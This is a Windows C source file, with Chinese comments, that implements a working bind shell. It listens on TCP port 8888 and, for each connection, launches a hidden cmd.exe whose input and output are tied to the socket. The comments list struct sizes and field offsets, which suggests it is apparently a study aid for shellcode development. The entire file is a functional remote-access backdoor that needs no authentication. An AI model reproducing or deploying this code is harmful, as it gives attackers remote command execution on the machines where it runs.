#define _WINSOCK_DEPRECATED_NO_WARNINGS 1 
#include <winsock2.h>
#include<Windows.h>
#include<stdio.h>
#pragma comment(lib,"ws2_32.lib")
int mainBind()
{
	//初始化网络环境
	WSADATA wsaData{};
	int result = WSAStartup(0x0202, &wsaData);
	SOCKET socket = INVALID_SOCKET;
	socket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	SOCKADDR_IN serverAddr;
	serverAddr.sin_addr.S_un.S_addr = INADDR_ANY; // 0
	serverAddr.sin_port = htons(8888); // 22b8 ==> 大端序 b822
	serverAddr.sin_family = AF_INET; // 2
	bind(socket, (LPSOCKADDR)&serverAddr, sizeof(SOCKADDR_IN));
	listen(socket, 0x10); // 可以接收多少客户端连接

	printf("WSADATA size:%d\n", sizeof(WSADATA));
	printf("SOCKET size:%d\n", sizeof(SOCKET));
	printf("SOCKADDR_IN size:%d\n", sizeof(SOCKADDR_IN));
	printf("PROCESS_INFORMATION size:%d\n", sizeof(PROCESS_INFORMATION));
	printf("STARTUPINFOA size:%d\n", sizeof(STARTUPINFOA));
	// WSADATA size : 400
	//SOCKET size : 4
	//SOCKADDR_IN size : 16
	//PROCESS_INFORMATION size : 16
	//STARTUPINFOA size : 68

	while (1)
	{

		SOCKET conn  = accept(socket, 0, 0); // 定义一个新的socket对象
		PROCESS_INFORMATION pinfo{};
		STARTUPINFOA sinfo{};
		sinfo.cb = sizeof(STARTUPINFOA);
		sinfo.wShowWindow = SW_HIDE; // 0 0x2c
		sinfo.dwFlags = STARTF_USESTDHANDLES; // 0x100 0x30
		sinfo.hStdInput = (HANDLE)conn; // 0x38
		sinfo.hStdOutput = (HANDLE)conn; // 0x3c
		sinfo.hStdError = (HANDLE)conn; // 0x40
		CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, TRUE, 0, 0, 0, &sinfo, &pinfo);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}




	//关闭句柄释放资源

	closesocket(socket);
	WSACleanup();
	return 0;
}